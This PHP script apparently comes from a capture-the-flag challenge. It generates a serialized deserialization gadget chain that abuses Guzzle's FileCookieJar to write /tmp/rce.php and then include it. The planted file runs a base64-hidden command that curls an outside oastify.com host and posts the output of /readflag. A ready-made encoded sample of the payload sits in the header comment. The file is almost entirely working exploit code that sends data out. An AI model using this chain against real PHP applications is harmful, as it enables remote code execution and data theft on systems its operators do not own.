<?php 
/*
 * Generate a guzzle exploit chain, sample:
 * 
 * a:7:{s:8:\"gadget_0\";O:28:\"www_frontend_vendor_autoload\":0:{}s:8:\"gadget_1\";O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":3:{s:8:\"filename\";s:12:\"/tmp/rce.php\";s:19:\"storeSessionCookies\";b:1;s:7:\"cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:4:\"data\";a:1:{i:0;s:131:\"<?php system(base64_decode('Y3VybCBodHRwOi8vZ2F1czgyeDJxdDF1ZDBheHF6YmR6N21rNGJhMXlxLm9hc3RpZnkuY29tIC1kICQoL3JlYWRmbGFnKQ==')); ?>\";}}}}s:8:\"gadget_2\";O:7:\"tmp_rce\":0:{}s:9:\"Dashboard\";b:1;s:7:\"Product\";b:1;s:5:\"Order\";b:1;s:4:\"User\";b:1;}
 */

require __DIR__ . "/../challenge/frontend/vendor/autoload.php";
require 'www_frontend_vendor_autoload.php';
require 'tmp_rce.php';
require 'GuzzleArbitraryWrite.php';

$payloadFileName = 'rce';
$collaboratorUrl = 'gaus82x2qt1ud0axqzbdz7mk4ba1yq.oastify.com';

// Gadget 1: Make spl_autoload to load frontend vendor.php
$frontendAutoload = new www_frontend_vendor_autoload();

// Gadget 2: Arbitrary write
$command = \base64_encode(
    \sprintf(
        "curl http://%s -d $(/readflag)",
        $collaboratorUrl
    )
);
$data = [
    \sprintf(
        "<?php system(base64_decode('%s')); ?>",
        $command,
    )
];

$setCookie = new GuzzleHttp\Cookie\SetCookie();
$setCookie->data = $data;
$cookies = [$setCookie]; 

$filename = \sprintf(
    "/tmp/%s.php", 
    $payloadFileName
);                                                                                                                                                   
                                                                                                             
$fileCookieJar = new GuzzleHttp\Cookie\FileCookieJar();                                                                        
$fileCookieJar->cookies = $cookies;                                                                          
$fileCookieJar->filename = $filename;                                                                        
$fileCookieJar->storeSessionCookies = true;

// Gadget 3: Trigger file include, exploiting same Gadget 1 trick
$tmpRce = new tmp_rce();

$payload = [                                                                                                 
        'gadget_0' => $frontendAutoload,  // frontend autoload libs                                    
        'gadget_1' => $fileCookieJar,     // create arbitrary php rce file
        'gadget_2' => $tmpRce,            // trigger rce                                                                   
        'Dashboard' => true,                                                                                 
        'Product' => true,
        'Order' => true,
        'User' => true
];

$data = \serialize($payload);
$data = \str_replace("\\", "\\\\", $data);
$data = \str_replace('"', '\\"', $data);
echo $data . PHP_EOL;
echo base64_encode($data) . PHP_EOL;